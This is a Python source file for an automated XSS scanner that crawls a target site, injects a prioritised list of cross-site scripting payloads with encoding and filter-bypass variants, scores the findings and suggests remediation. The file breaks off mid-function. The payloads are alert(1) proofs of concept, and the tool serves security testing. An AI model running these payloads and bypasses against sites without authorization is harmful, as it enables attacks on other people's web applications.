#modules/xss/scanner.py
import asyncio
import aiohttp
import random
import re
import sys
import json
import html
import urllib.parse
import base64
import time
import os
import logging
from collections import defaultdict
from typing import Dict, List, Set, Tuple, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.progress import (
    Progress,
    BarColumn,
    TextColumn,
    TimeRemainingColumn,
    TimeElapsedColumn,
    TaskProgressColumn,
    MofNCompleteColumn,
    TaskID
)

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from .models import XSSContext, VulnerabilitySeverity, XSSVulnerability
from .report import ReportGenerator
from core.randomizer import HeaderFactory
from core.utils import clear_console, header_banner

console = Console()
logger = logging.getLogger(__name__)

# ==================== Payload Management ====================

class PayloadGenerator:
    def __init__(self, max_payloads_per_context: int = 15):
        self.max_payloads_per_context = max_payloads_per_context
        self.base_payloads = self._load_base_payloads()
        self.encoding_functions = {
            'url': lambda x: urllib.parse.quote(x),
            'double_url': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            'html': lambda x: html.escape(x),
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'hex': lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            'mixed_case': lambda x: ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in x)
        }
        # Priority order for contexts (higher priority = more critical)
        self.context_priority = {
            XSSContext.JAVASCRIPT: 10,
            XSSContext.EVENT_HANDLER: 9,
            XSSContext.HTML_TAG: 8,
            XSSContext.HTML_ATTRIBUTE: 7,
            XSSContext.URL: 6,
            XSSContext.CSS: 5,
            XSSContext.JSON: 4,
            XSSContext.COMMENT: 2,
            XSSContext.CDATA: 1,
        }

    def _load_base_payloads(self) -> Dict[XSSContext, List[Tuple[str, int]]]:
        """Load base payloads with priority scores (higher = more effective)"""
        return {
            XSSContext.HTML_TAG: [
                ("<script>alert(1)</script>", 10), ("<img src=x onerror=alert(1)>", 9),
                ("<svg onload=alert(1)>", 9), ("<iframe src=javascript:alert(1)>", 8),
                ("<body onload=alert(1)>", 7), ("<object data=javascript:alert(1)>", 6),
                ("<embed src=javascript:alert(1)>", 6), ("<video><source onerror=alert(1)>", 5),
                ("<audio src=x onerror=alert(1)>", 5), ("<<SCRIPT>alert(1)//<</SCRIPT>", 8),
                ("<script src=data:,alert(1)>", 7), ("<marquee onstart=alert(1)>", 4),
                ("<details open ontoggle=alert(1)>", 4), ("<meter onmouseover=alert(1)>", 3),
            ],
            XSSContext.HTML_ATTRIBUTE: [
                ("' onmouseover='alert(1)", 9), ("\" autofocus onfocus=alert(1) x=\"", 9),
                ("' autofocus onfocus='alert(1)' x='", 8), ("javascript:alert(1)", 8),
                ("' onclick=alert(1) '", 7), ("\" style=\"background:url(javascript:alert(1))\"", 6),
                ("' accesskey='X' onclick='alert(1)' '", 5), ("\" onmouseenter=\"alert(1)\" x=\"", 5),
            ],
            XSSContext.JAVASCRIPT: [
                ("';alert(1)//", 10), ("\";alert(1)//", 10), ("\\';alert(1)//", 9),
                ("\\x27;alert(1)//", 8), ("\\x22;alert(1)//", 8), ("</script><script>alert(1)</script>", 9),
                ("'+alert(1)+'", 7), ("\"+alert(1)+\"", 7), ("-alert(1)-", 6),
                ("/alert(1)/", 6), ("\\u0027;alert(1)//", 7),
            ],
            XSSContext.EVENT_HANDLER: [
                ("alert(1)", 10), ("alert`1`", 9), ("eval('alert(1)')", 8),
                ("setTimeout(alert,0,1)", 7), ("setInterval(alert,0,1)", 6),
                ("Function('alert(1)')()", 6), ("constructor.constructor('alert(1)')()", 5),
                ("[].map.call('alert(1)',eval)", 4),
            ],
            XSSContext.URL: [
                ("javascript:alert(1)", 10), ("data:text/html,<script>alert(1)</script>", 9),
                ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", 8),
                ("vbscript:alert(1)", 6),
                ("javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/*\"`'/**/alert(1)//'>", 7),
            ],
            XSSContext.CSS: [
                ("expression(alert(1))", 8), ("url(javascript:alert(1))", 7),
                ("url(data:,alert(1))", 6), ("@import 'javascript:alert(1)'", 5),
                ("behavior:url(#default#time2)", 4),
            ],
            XSSContext.JSON: [
                ("\",\"xss\":\"<script>alert(1)</script>\",\"", 8),
                ("\\\"onclick=\\\"alert(1)\\\"", 7),
                ("\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", 6),
            ]
        }

    def generate_context_payloads(self, context: XSSContext, bypass_filters: bool = True) -> List[str]:
        """Generate payloads for specific context with deduplication"""
        base_payloads = self.base_payloads.get(context, [])

        # Sort by priority and take top payloads
        base_payloads.sort(key=lambda x: x[1], reverse=True)
        selected_payloads = [payload for payload, _ in base_payloads[:self.max_payloads_per_context//2]]

        if not bypass_filters:
            return selected_payloads[:self.max_payloads_per_context]

        enhanced_payloads = set(selected_payloads)  # Use set for deduplication

        # Add encoded variants for top payloads only
        for payload in selected_payloads[:5]:  # Only top 5 get encoding variants
            for encoding_name, encoding_func in list(self.encoding_functions.items())[:3]:  # Limit encodings
                try:
                    encoded = encoding_func(payload)
                    if encoded != payload:  # Avoid adding identical payloads
                        enhanced_payloads.add(encoded)
                except:
                    continue

            #add bypass variants for top payloads
            enhanced_payloads.update(self._generate_bypass_variants(payload))

        # Return limited list, maintaining priority order
        return list(enhanced_payloads)[:self.max_payloads_per_context]

    def _generate_bypass_variants(self, payload: str) -> List[str]:
        """Generate filter bypass variants"""
        variants = []

        # Only generate variants that are significantly different
        if 'script' in payload.lower():
            variants.extend([
                payload.replace('script', 'scr\x00ipt'),
                payload.replace('script', 'Ñ•ÑrÑ–Ñ€t'),
                payload.upper(),
                payload.lower()
            ])

        if 'alert' in payload.lower():
            variants.append(payload.replace('alert', 'al/**/ert'))

        if ' ' in payload:
            variants.extend([
                payload.replace(' ', '\t'),
                payload.replace(' ', '\n')
            ])

        return variants[:4]  # Limit bypass variants

# ==================== Context Analysis ====================

class HTMLContextParser:
    def __init__(self):
        self.context_priority = {
            XSSContext.JAVASCRIPT: 10,
            XSSContext.EVENT_HANDLER: 9,
            XSSContext.HTML_TAG: 8,
            XSSContext.HTML_ATTRIBUTE: 7,
            XSSContext.URL: 6,
            XSSContext.CSS: 5,
            XSSContext.JSON: 4,
            XSSContext.COMMENT: 2,
            XSSContext.CDATA: 1,
        }

    def analyze_context(self, html_content: str, payload: str) -> List[Tuple[XSSContext, str, float]]:
        """Analyze context with confidence scores and prioritization"""
        contexts = []
        soup = BeautifulSoup(html_content, 'html.parser')

        contexts.extend(self._check_javascript(html_content, payload))
        contexts.extend(self._check_event_handlers(soup, payload))
        contexts.extend(self._check_html_tags(soup, payload))
        contexts.extend(self._check_attributes(soup, payload))
        contexts.extend(self._check_css(soup, payload))
        contexts.extend(self._check_json(html_content, payload))
        contexts.extend(self._check_comments(html_content, payload))

        # Sort by priority and confidence, return only the best match
        if contexts:
            contexts.sort(key=lambda x: (self.context_priority.get(x[0], 0), x[2]), reverse=True)
            return [contexts[0]]  #return only the highest priority context
        return []

    def _check_html_tags(self, soup: BeautifulSoup, payload: str) -> List[Tuple[XSSContext, str, float]]:
        contexts = []
        
        for node in soup.find_all(text=True):
            if payload in str(node):
                parent = node.parent.name if node.parent else 'text'
                if parent in ['script', 'style']:
                    confidence = 0.9
                elif parent in ['title', 'textarea']:
                    confidence = 0.4
                else:
                    confidence = 0.2
                contexts.append((XSSContext.HTML_TAG, f"Found in <{parent}> tag", confidence))
        return contexts

    def _check_attributes(self, soup: BeautifulSoup, payload: str) -> List[Tuple[XSSContext, str, float]]:
        contexts = []
        dangerous_attrs = ['src', 'href', 'action', 'formaction', 'data']

        for tag in soup.find_all(True):
            for attr, value in tag.attrs.items():
                if isinstance(value, str) and payload in value:
                    confidence = 0.9 if attr in dangerous_attrs else 0.7
                    contexts.append((XSSContext.HTML_ATTRIBUTE, f"Found in {tag.name}[{attr}]", confidence))
                elif isinstance(value, list) and any(payload in str(v) for v in value):
                    confidence = 0.8 if attr in dangerous_attrs else 0.6
                    contexts.append((XSSContext.HTML_ATTRIBUTE, f"Found in {tag.name}[{attr}]", confidence))
        return contexts

    def _check_javascript(self, html_content: str, payload: str) -> List[Tuple[XSSContext, str, float]]:
        script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE)
        for match in script_pattern.finditer(html_content):
            if payload in match.group(1):
                return [(XSSContext.JAVASCRIPT, "Found in <script> block", 0.95)]
        return []

    def _check_event_handlers(self, soup: BeautifulSoup, payload: str) -> List[Tuple[XSSContext, str, float]]:
        contexts = []
        event_attrs = ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onblur',
                       'onchange', 'onsubmit', 'onkeyup', 'onkeydown', 'onmouseenter', 'onmouseleave']

        for tag in soup.find_all(True):
            for event in event_attrs:
                if tag.has_attr(event) and payload in tag[event]:
                    confidence = 0.95 if event in ['onclick', 'onload', 'onerror'] else 0.85
                    contexts.append((XSSContext.EVENT_HANDLER, f"Found in {tag.name}[{event}]", confidence))
        return contexts

    def _check_css(self, soup: BeautifulSoup, payload: str) -> List[Tuple[XSSContext, str, float]]:
        contexts = []
        for style in soup.find_all('style'):
            if payload in style.get_text():
                contexts.append((XSSContext.CSS, "Found in <style> block", 0.8))
        for tag in soup.find_all(style=True):
            if payload in tag['style']:
                contexts.append((XSSContext.CSS, f"Found in {tag.name}[style]", 0.7))
        return contexts

    def _check_json(self, html_content: str, payload: str) -> List[Tuple[XSSContext, str, float]]:
        json_pattern = re.compile(r'\{[^{}]*\}|\[[^\[\]]*\]')
        for match in json_pattern.finditer(html_content):
            if payload in match.group():
                try:
                    json.loads(match.group())
                    return [(XSSContext.JSON, "Found in JSON data", 0.6)]
                except:
                    pass
        return []

    def _check_comments(self, html_content: str, payload: str) -> List[Tuple[XSSContext, str, float]]:
        comment_pattern = re.compile(r'<!--(.*?)-->', re.DOTALL)
        if any(payload in match.group(1) for match in comment_pattern.finditer(html_content)):
            return [(XSSContext.COMMENT, "Found in HTML comment", 0.3)]
        return []

# ==================== Rate Limiting ====================

class PerDomainRateLimiter:
    def __init__(self, default_rate: int = 10):
        self.default_rate = default_rate
        self.domain_limiters = defaultdict(lambda: asyncio.Semaphore(self.default_rate))
        self.last_requests = defaultdict(float)
        self.min_intervals = defaultdict(lambda: 1.0 / self.default_rate if self.default_rate > 0 else 0)

    async def acquire(self, domain: str):
        """Acquire rate limit for specific domain"""
        semaphore = self.domain_limiters[domain]
        min_interval = self.min_intervals[domain]

        async with semaphore:
            if min_interval > 0:
                now = time.time()
                elapsed = now - self.last_requests[domain]
                if elapsed < min_interval:
                    await asyncio.sleep(min_interval - elapsed)
                self.last_requests[domain] = time.time()

# ==================== Scanner Engine ==================

class XSSScanner:
    def __init__(self, target_url: str, config: Optional[Dict] = None):
        self.target_url = target_url
        self.config = self._default_config()
        if config:
            self.config.update(config)

        self.parser = HTMLContextParser()
        self.payload_generator = PayloadGenerator(self.config.get('max_payloads_per_context', 15))
        self.header_factory = HeaderFactory()
        self.vulnerabilities: List[XSSVulnerability] = []
        self.rate_limiter = PerDomainRateLimiter(self.config['rate_limit'])
        self.cancelled = False

        # Setup logging
        if self.config.get('verbose'):
            logging.basicConfig(level=logging.INFO)

    def _default_config(self) -> Dict:
        return {
            'max_depth': 3, 'max_pages': 100, 'timeout': 10, 'threads': 20,
            'rate_limit': 10, 'follow_redirects': True, 'test_cookies': True,
            'test_headers': True, 'test_json': True, 'stealth_mode': False,
            'proxy': None, 'user_agent_rotation': True, 'verbose': True,
            'smart_mode': True, 'max_payloads_per_context': 15,
            'batch_size': 50, 'max_retries': 3, 'retry_delay': 1.0
        }

    async def scan(self) -> List[XSSVulnerability]:
        config_table = Table.grid(padding=(0, 2), expand=True)
        config_table.add_column(style="bold cyan", justify="right")
        config_table.add_column()
        config_table.add_row("Target URL:", self.target_url)
        config_table.add_row("Threads:", str(self.config['threads']))
        config_table.add_row("Rate Limit:", f"{self.config['rate_limit']} req/s")
        config_table.add_row("Smart Mode:", "Enabled" if self.config['smart_mode'] else "Disabled")
        config_table.add_row("Stealth Mode:", "Enabled" if self.config['stealth_mode'] else "Disabled")
        config_table.add_row("Batch Size:", str(self.config['batch_size']))

        console.print(Panel(
            config_table,
            title="[bold cyan]XSS Scanner Configuration[/bold cyan]",
            border_style="green"
        ))

        progress_columns = [
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
            TimeRemainingColumn(),
        ]

        try:
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=self.config['timeout']),
                connector=aiohttp.TCPConnector(limit=self.config['threads'])
            ) as session:
                with Progress(*progress_columns, console=console) as progress:
                    task_discover = progress.add_task("[cyan]Discovering endpoints...", total=None)
                    endpoints = await self._discover_endpoints(session, progress, task_discover)
                    progress.update(task_discover, total=1, completed=1, description="[green]Discovered endpoints")

                    if self.cancelled: return self.vulnerabilities

                    injection_points = self._analyze_injection_points(endpoints)
                    progress.add_task("[green]Analyzing injection points...", total=len(injection_points), completed=len(injection_points))

                    if self.cancelled: return self.vulnerabilities

                    contextual_points = injection_points
                    if self.config['smart_mode']:
                        task_context = progress.add_task("[blue]Determining contexts...", total=len(injection_points))
                        contextual_points = await self._determine_contexts(session, injection_points, progress, task_context)

                    if self.cancelled: return self.vulnerabilities

                    task_test = progress.add_task("[red]Testing payloads...", total=None)
                    await self._test_payloads_batched(session, contextual_points, progress, task_test)

                    if self.cancelled: return self.vulnerabilities

                    task_verify = progress.add_task("[yellow]Verifying vulnerabilities...", total=1)
                    self._verify_vulnerabilities()
                    progress.update(task_verify, completed=1)

            return self.vulnerabilities
        except (Exception, asyncio.CancelledError) as e:
            if isinstance(e, (asyncio.CancelledError, KeyboardInterrupt)):
                self.cancelled = True
                logger.warning("Scan cancelled by user.")
            else:
                logger.error(f"Scan failed: {e}", exc_info=True)
            return self.vulnerabilities

    async def _determine_contexts(self, session: aiohttp.ClientSession, injection_points: List[Dict], progress: Progress, task_id: TaskID) -> List[Dict]:
        contextual_points = []
        semaphore = asyncio.Semaphore(self.config['threads'])

        async def get_context(point):
            async with semaphore:
                if self.cancelled: return

                probe = f"dKryptPr0b3{random.randint(1000, 9999)}"
                endpoint, param = point['endpoint'], point['parameter']
                method = endpoint.get('method', 'GET')
                url = endpoint['url']

                params, data = None, None
                if method == 'GET':
                    params = {param: probe}
                else:
                    if endpoint.get('type') == 'form':
                        data = {p: v.get('value', '') for p, v in endpoint['params'].items()}
                        data[param] = probe
                    else:
                        data = {param: probe}

                try:
                    domain = urlparse(url).netloc
                    await self.rate_limiter.acquire(domain)

                    async with session.request(method, url, params=params, data=data, headers=self.header_factory.get_headers(), allow_redirects=self.config['follow_redirects']) as response:
                        if response.status < 400:
                            content = await response.text()
                            if probe in content:
                                contexts_found = self.parser.analyze_context(content, probe)
                                if contexts_found:
                                    point['contexts'] = [c[0] for c in contexts_found]
                                    contextual_points.append(point)
                except Exception as e:
                    logger.debug(f"Context analysis failed for {param} at {url}: {e}")
                finally:
                    progress.update(task_id, advance=1)

        tasks = [get_context(point) for point in injection_points]
        await asyncio.gather(*tasks)

        progress.update(task_id, description=f"[green]Analyzed {len(contextual_points)} contextual points")
        return contextual_points

    async def _test_payloads_batched(self, session: aiohttp.ClientSession, injection_points: List[Dict],
                                progress: Progress, task_id: TaskID):
        semaphore = asyncio.Semaphore(self.config['threads'])

        tests_to_run = []
        for point in injection_points:
            contexts_to_test = point.get('contexts')
            if not self.config['smart_mode'] or not contexts_to_test:
                contexts_to_test = [XSSContext.HTML_TAG, XSSContext.HTML_ATTRIBUTE, XSSContext.JAVASCRIPT]

            for ctx in contexts_to_test:
                payloads = self.payload_generator.generate_context_payloads(ctx)
                for payload in payloads:
                    tests_to_run.append((point, payload, ctx))

        progress.update(task_id, total=len(tests_to_run))

        tasks = [
            asyncio.create_task(self._test_single_payload_with_retry(session, point, payload, ctx, semaphore))
            for point, payload, ctx in tests_to_run
        ]

        batch_size = self.config['batch_size']
        for i in range(0, len(tasks), batch_size):
            if self.cancelled:
                for task in tasks[i:]: task.cancel()
                break

            batch = tasks[i:i+batch_size]
            results = await asyncio.gather(*batch, return_exceptions=True)
            self._process_results(results)
            progress.update(task_id, advance=len(batch))

    def _process_results(self, results):
        """Process batch results and collect vulnerabilities"""
        for result in results:
            if isinstance(result, XSSVulnerability):
                self.vulnerabilities.append(result)
            elif isinstance(result, (asyncio.CancelledError, KeyboardInterrupt)):
                self.cancelled = True
            elif isinstance(result, Exception) and not isinstance(result, (asyncio.TimeoutError, aiohttp.ClientError)):
                logger.warning(f"Unexpected error in batch: {result}")

    async def _test_single_payload_with_retry(self, session: aiohttp.ClientSession, point: Dict,
                                            payload: str, context: XSSContext, semaphore: asyncio.Semaphore) -> Optional[XSSVulnerability]:
        """Test single payload with retry logic and rate limiting"""
        async with semaphore:
            if self.cancelled: return None

            domain = urlparse(point['endpoint']['url']).netloc
            await self.rate_limiter.acquire(domain)

            for attempt in range(self.config['max_retries']):
                if self.cancelled: return None
                try:
                    return await self._test_single_payload(session, point, payload, context)
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                    if attempt < self.config['max_retries'] - 1:
                        delay = self.config['retry_delay'] * (2 ** attempt)
                        await asyncio.sleep(delay)
                        logger.info(f"Retrying request after {delay:.1f}s (attempt {attempt + 2})")
                    else:
                        logger.debug(f"Max retries exceeded for {point['parameter']}: {e}")
                except Exception as e:
                    logger.warning(f"Unexpected error testing {point['parameter']}: {e}")
                    break
            return None

    async def _test_single_payload(self, session: aiohttp.ClientSession, point: Dict,
                                 payload: str, context: XSSContext) -> Optional[XSSVulnerability]:
        """Core payload testing logic"""
        endpoint, param = point['endpoint'], point['parameter']
        method = endpoint.get('method', 'GET')
        url = endpoint['url']

        params, data = None, None
        if method == 'GET':
            params = {param: payload}
        else:
            if endpoint.get('type') == 'form':
                data = {p: v.get('value', '') for p, v in endpoint['params'].items()}
            else:
                data = {}
            data[param] = payload

        start_time = time.time()
        async with session.request(
            method, url, params=params, data=data,
            headers=self.header_factory.get_headers(),
            allow_redirects=self.config['follow_redirects']
        ) as response:

            content_type = response.headers.get('Content-Type', '').lower()
            if not any(t in content_type for t in ['text', 'html', 'json', 'xml']):
                return None

            content = await response.text()
            if self._is_payload_reflected(content, payload):
                if not self._is_payload_executable(content, payload):
                    return None

                contexts = self.parser.analyze_context(content, payload)
                if contexts:
                    context_info, description, confidence = contexts[0]

                    vuln = XSSVulnerability(
                        url=str(response.url), method=method, parameter=param, payload=payload,
                        context=context_info, severity=self._calculate_severity(context_info, confidence),
                        evidence=self._extract_evidence(content, payload),
                        response_time=time.time() - start_time,
                        status_code=response.status, headers=dict(response.headers),
                        request_data={'param': param, 'payload': payload}
                    )
                    vuln.description = description
                    vuln.cvss_score = self._calculate_cvss(vuln, confidence)
                    vuln.remediation = self._generate_remediation(vuln)
                    return vuln
        return None

    async def _discover_endpoints(self, session: aiohttp.ClientSession, progress: Progress, task_id: TaskID) -> List[Dict]:
        """Endpoint discovery with session management"""
        endpoints = []
        crawled_data = await self._crawl_website(session, self.target_url, progress, task_id)
        for url, data in crawled_data.items():
            if data.get('params'):
                endpoints.append({
                    'url': url, 'method': 'GET', 'params': data['params'], 'type': 'query'
                })
            for form in data.get('forms', []):
                endpoints.append({
                    'url': form['action'], 'method': form['method'].upper(),
                    'params': form['inputs'], 'type': 'form'
                })
            for ajax_url in data.get('ajax_endpoints', []):
                endpoints.append({
                    'url': ajax_url, 'method': 'POST', 'params': {}, 'type': 'ajax'
                })
        console.print(f"[green]Discovered {len(endpoints)} endpoints[/green]")
        return endpoints

    async def _crawl_website(self, session: aiohttp.ClientSession, start_url: str,
                            progress: Progress, task_id: TaskID, depth: int = 0) -> Dict:
        crawled_data, to_visit, visited = {}, {start_url}, set()

        while to_visit and len(visited) < self.config['max_pages'] and not self.cancelled:
            url = to_visit.pop()
            if url in visited or urlparse(url).netloc != urlparse(start_url).netloc:
                continue
            visited.add(url)

            progress.update(task_id, description=f"[cyan]Crawling {url[:70]}...")

            try:
                domain = urlparse(url).netloc
                await self.rate_limiter.acquire(domain)

                async with session.get(url, headers=self.header_factory.get_headers()) as response:
                    if response.status != 200:
                        continue

                    content_type = response.headers.get('Content-Type', '').lower()
                    if 'html' not in content_type:
                        continue

                    content = await response.text()
                    soup = BeautifulSoup(content, 'html.parser')
                    crawled_data[url] = {
                        'params': self._extract_url_params(url),
                        'forms': self._extract_forms(soup, url),
                        'ajax_endpoints': self._extract_ajax_endpoints(content),
                    }

                    # Add new links
                    for link in soup.find_all('a', href=True):
                        if len(to_visit) + len(visited) < self.config['max_pages'] * 1.5:
                            to_visit.add(urljoin(url, link['href']))

            except Exception as e:
                logger.debug(f"Error crawling {url}: {e}")

        return crawled_data

    def _extract_url_params(self, url: str) -> List[str]:
        return list(parse_qs(urlparse(url).query).keys())

    def _extract_forms(self, soup: BeautifulSoup, base_url: str) -> List[Dict]:
        forms = []
        for form in soup.find_all('form'):
            form_data = {
                'action': urljoin(base_url, form.get('action', '')),
                'method': form.get('method', 'get').lower(),
                'inputs': {}
            }
            for tag in form.find_all(['input', 'textarea', 'select']):
                if name := tag.get('name'):
                    form_data['inputs'][name] = {
                        'type': tag.get('type', 'text'),
                        'value': tag.get('value', '')
                    }
            forms.append(form_data)
        return forms

    def _extract_ajax_endpoints(self, content: str) -> List[str]:
        patterns = [
            r'fetch\([\'"]([^\'"]+)[\'"]\)',
            r'\.ajax\({[^}]*url:\s*[\'"]([^\'"]+)[\'"]'
        ]
        endpoints = []
        for pattern in patterns:
            endpoints.extend(re.findall(pattern, content, re.I))
        return list(set(endpoints))

    def _analyze_injection_points(self, endpoints: List[Dict]) -> List[Dict]:
        """Handle injection point analysis with prioritization system"""
        injection_points = []
        for endpoint in endpoints:
            for param_name in endpoint.get('params', {}):
                priority = self._calculate_priority(param_name, endpoint)
                injection_points.append({
                    'endpoint': endpoint,
                    'parameter': param_name,
                    'priority': priority
                })

        if self.config['smart_mode']:
            injection_points.sort(key=lambda x: x['priority'], reverse=True)
            # Limit to top injection points to improve efficiency
            max_points = self.config.get('max_injection_points', 200)
            injection_points = injection_points[:max_points]

        return injection_points

    def _calculate_priority(self, param_name: str, endpoint: Dict) -> int:
        """priority calculation"""
        priority = 0

        # Parameter name analysis
        high_priority = ['q', 'search', 'query', 'keyword', 'term', 'data', 'input', 'content', 'url', 'redirect']
        medium_priority = ['name', 'title', 'comment', 'message', 'text', 'value', 'page', 'id']

        param_lower = param_name.lower()
        if any(hp in param_lower for hp in high_priority):
            priority += 15
        elif any(mp in param_lower for mp in medium_priority):
            priority += 10

        # Endpoint type analysis
        if endpoint.get('type') == 'query':
            priority += 5
        elif endpoint.get('method') == 'POST':
            priority += 8
        elif endpoint.get('type') == 'ajax':
            priority += 12
        elif endpoint.get('type') == 'form':
            priority += 10

        return priority

    def _is_payload_reflected(self, content: str, payload: str) -> bool:
        """reflection detection"""
        #use a simplified version of the payload for reflection check to handle encoding
        simple_payload = re.sub(r'[^a-zA-Z0-9]', '', payload)[:10]
        if not simple_payload: return payload in content

        checks = [
            payload in content,
            html.escape(payload) in content,
            urllib.parse.quote(payload) in content,
            simple_payload in html.escape(content),
        ]
        return any(checks)

    # NEW: Stricter execution verification method
    def _is_payload_executable(self, content: str, payload: str) -> bool:
        """Check if payload is likely to execute instead of just reflecting"""
        # This check is based on the user's request to verify execution context.
        # We look for the core part of our payloads ("dKryptXSS" probe equivalent) in contexts where it could run.
        probe = "alert(1)"

        # 1. Direct script tag execution check (e.g., <script>alert(1)</script>)
        if re.search(r"<script[^>]*>.*" + re.escape(probe), content, re.I | re.S):
            return True
        
        # 2. Event handler check (e.g., onerror="alert(1)")
        if re.search(r"on\w+\s*=\s*[\"'].*" + re.escape(probe) + r".*[\"']", content, re.I):
            return True
            
        # 3. Inline JS context, for when the probe is inside a JS string
        # This is a weaker indicator but follows the user's requested logic pattern.
        if re.search(r"['\"]" + re.escape(probe) + r"['\"]", content):
            return True

        return False

    def _extract_evidence(self, content: str, payload: str) -> str:
        """evidence extraction"""
        # Try different payload variations
        variations = [payload, html.escape(payload), urllib.parse.quote(payload)]

        for variation in variations:
            try:
                index = content.index(variation)
                start = max(0, index - 100)
                end = min(len(content), index + len(variation) + 100)
                evidence = content[start:end]
                # Use rich-style highlighting
                return evidence.replace(variation, f"[bold red]{variation}[/bold red]")
            except ValueError:
                continue

        return "Payload reflected but exact location unclear"

    def _calculate_severity(self, context: XSSContext, confidence: float) -> VulnerabilitySeverity:
        """severity calculation with confidence system and weighting"""
        base_severity_map = {
            XSSContext.JAVASCRIPT: VulnerabilitySeverity.CRITICAL,
            XSSContext.EVENT_HANDLER: VulnerabilitySeverity.HIGH,
            XSSContext.HTML_TAG: VulnerabilitySeverity.HIGH,
            XSSContext.HTML_ATTRIBUTE: VulnerabilitySeverity.MEDIUM,
            XSSContext.URL: VulnerabilitySeverity.MEDIUM,
            XSSContext.CSS: VulnerabilitySeverity.MEDIUM,
            XSSContext.JSON: VulnerabilitySeverity.MEDIUM,
            XSSContext.COMMENT: VulnerabilitySeverity.LOW,
            XSSContext.CDATA: VulnerabilitySeverity.LOW,
        }

        base_severity = base_severity_map.get(context, VulnerabilitySeverity.LOW)

        # Adjust severity based on confidence
        if confidence < 0.5:
            # Downgrade severity for low confidence
            severity_downgrade = {
                VulnerabilitySeverity.CRITICAL: VulnerabilitySeverity.HIGH,
                VulnerabilitySeverity.HIGH: VulnerabilitySeverity.MEDIUM,
                VulnerabilitySeverity.MEDIUM: VulnerabilitySeverity.LOW,
                VulnerabilitySeverity.LOW: VulnerabilitySeverity.INFO,
            }
            return severity_downgrade.get(base_severity, VulnerabilitySeverity.INFO)

        return base_severity

    def _calculate_cvss(self, vuln: XSSVulnerability, confidence: float = 1.0) -> float:
        """CVSS calculation with confidence weighting"""
        base_scores = {
            VulnerabilitySeverity.CRITICAL: 9.5,
            VulnerabilitySeverity.HIGH: 7.8,
            VulnerabilitySeverity.MEDIUM: 5.5,
            VulnerabilitySeverity.LOW: 3.2,
            VulnerabilitySeverity.INFO: 0.5
        }

        score = base_scores.get(vuln.severity, 3.1)

        #context-based adjustments
        if vuln.context in [XSSContext.JAVASCRIPT, XSSContext.EVENT_HANDLER]:
            score = min(10.0, score + 0.8)
        elif vuln.context == XSSContext.HTML_TAG:
            score = min(10.0, score + 0.5)

        # Confidence-based adjustment
        score *= confidence

        return round(score, 1)

    def _generate_remediation(self, vuln: XSSVulnerability) -> str:
        """remediation suggestions"""
        remediations = {
            XSSContext.JAVASCRIPT: "1. Implement strict output encoding for JavaScript contexts. 2. Use CSP with 'unsafe-inline' restrictions. 3. Validate and sanitize all user inputs.",
            XSSContext.EVENT_HANDLER: "1. Avoid dynamic event handler generation. 2. Use addEventListener instead of inline handlers. 3. Implement strict CSP.",
            XSSContext.HTML_TAG: "1. Implement context-aware HTML encoding. 2. Use CSP headers. 3. Validate input against allowlists.",
            XSSContext.HTML_ATTRIBUTE: "1. Encode attribute values properly. 2. Use safe attribute allowlists. 3. Implement CSP.",
            XSSContext.URL: "1. Validate URLs against safe schemes. 2. Use URL encoding. 3. Implement strict URL validation.",
            XSSContext.CSS: "1. Sanitize CSS properties. 2. Use CSP for styles. 3. Avoid dynamic CSS generation.",
            XSSContext.JSON: "1. Properly escape JSON data. 2. Use safe JSON serialization. 3. Validate JSON structure.",
            XSSContext.COMMENT: "1. Remove or encode comments containing user data. 2. Use secure templating.",
        }

        base_remediation = remediations.get(vuln.context, "Implement proper input validation and output encoding.")
        return f"{base_remediation} 4. Regular security testing and code review."

    # final verification
    def _verify_vulnerabilities(self):
        verified = []
        for vuln in self.vulnerabilities:
            if vuln.context == XSSContext.HTML_TAG and hasattr(vuln, 'description'):
                match = re.search(r"Found in <([\w\-]+)> tag", vuln.description)
                if match:
                    parent_tag = match.group(1).lower()
                    if parent_tag not in ['script', 'style']:
                        continue 

            false_positive_score = self._calculate_false_positive_score(vuln)
            if false_positive_score < 0.6:
                vuln.false_positive_score = false_positive_score
                verified.append(vuln)

        console.print(f"[green]Verified {len(verified)} of {len(self.vulnerabilities)} potential vulnerabilities[/green]")
        self.vulnerabilities = verified

    def _calculate_false_positive_score(self, vuln: XSSVulnerability) -> float:
        score = 0.0

        # URL-based indicators
        error_indicators = ['error', 'debug', 'test', '404', '500']
        if any(indicator in vuln.url.lower() for indicator in error_indicators):
            score += 0.25

        # Response time indicators (very fast responses might be cached/static)
        if vuln.response_time < 0.05:
            score += 0.15
        elif vuln.response_time > 5.0:
            score += 0.1

        # Evidence quality
        if "[bold red]" not in vuln.evidence: # Check if payload was highlighted
            score += 0.4
        elif len(vuln.evidence.strip()) < 50:
            score += 0.2

        # Context-based scoring
        low_impact_contexts = [XSSContext.COMMENT, XSSContext.CDATA]
        if vuln.context in low_impact_contexts:
            score += 0.3

        # Status code indicators
        if vuln.status_code >= 400:
            score += 0.2

        return min(1.0, score)

# ==================== Main Entry Point ====================

async def run_xss_scan_interactive():
    clear_console()
    header_banner(tool_name="XSS Scanner")
    
    url = Prompt.ask("[bold yellow]Target URL[/bold yellow]", default="https://example.com")
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    
    threads = IntPrompt.ask(
        "[bold yellow]Number of threads[/bold yellow]", 
        default=20,
        show_default=True
    )
    
    rate_limit = IntPrompt.ask(
